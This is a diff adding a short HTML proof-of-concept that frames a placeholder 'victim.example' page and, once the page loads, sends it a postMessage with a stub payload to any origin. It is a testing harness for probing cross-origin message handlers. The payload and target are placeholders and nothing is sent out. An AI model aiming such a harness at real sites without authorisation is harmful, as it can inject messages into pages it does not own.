@@ -1,0 +1,37 @@
+<!doctype html>
+<!-- Frame a URL and send one postMessage after load -->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Iframe postMessage PoC</title>
+  <!-- Cache-busting helper function -->
+  <script>
+    function cacheBust(url) {
+      const u = new URL(url, location.href);
+      u.searchParams.set("_cb", Date.now());
+      return u.toString();
+    }
+  </script>
+</head>
+<body>
+  <iframe id="v" width="1000" height="1000"></iframe>
+
+  <script>
+    const TARGET_URL = "https://victim.example/page";
+    //const MESSAGE = '{"data":"<data>"}';
+    //const MESSAGE = JSON.stringify({"data":"<data>"});
+    const MESSAGE = "data";
+
+    const frame = document.getElementById("v");
+    frame.src = cacheBust(TARGET_URL);
+
+    frame.onload = () => {
+      frame.contentWindow.postMessage(MESSAGE, "*");
+      console.log("SENT", MESSAGE);
+    };
+
+    // Optional receive:
+    // window.addEventListener("message", (e) => console.log("RECV", e.origin, e.data));
+  </script>
+</body>
+</html>
